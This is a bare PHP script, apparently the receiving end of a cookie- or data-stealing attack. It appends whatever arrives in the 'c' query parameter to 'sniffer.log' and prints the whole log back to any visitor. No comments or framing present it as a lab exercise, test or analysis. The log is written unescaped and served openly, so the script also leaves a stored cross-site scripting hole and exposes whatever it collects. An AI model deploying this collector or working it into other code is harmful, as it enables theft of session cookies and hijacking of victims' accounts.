<?php
$file = "sniffer.log";
$c = file_get_contents($file);
$c .= $_GET["c"].'<br>';
file_put_contents($file,$c);
echo $c;
?>